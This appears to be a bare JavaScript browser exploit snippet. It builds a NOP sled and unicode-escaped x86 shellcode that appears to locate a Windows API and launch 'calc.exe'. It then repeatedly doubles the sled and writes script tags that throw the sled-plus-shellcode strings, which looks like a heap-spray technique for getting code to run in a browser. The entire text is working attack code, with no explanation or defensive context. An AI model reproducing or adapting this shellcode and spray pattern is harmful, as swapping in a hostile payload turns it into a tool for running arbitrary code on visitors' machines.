var nop_sled=unescape("%u9090");
var shellcode_sled=unescape("%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%u7e68%ue2d8%u6873%ufe98%u0e8a%uff57%u63e7%u6c61%u2e63%u7865%u0065");
for(var i=0;i<64;i++){
	nop_sled=nop_sled+nop_sled;
	document.write('<script>throw nop_sled+shellcode_sled;</scr'+'ipt>');
}
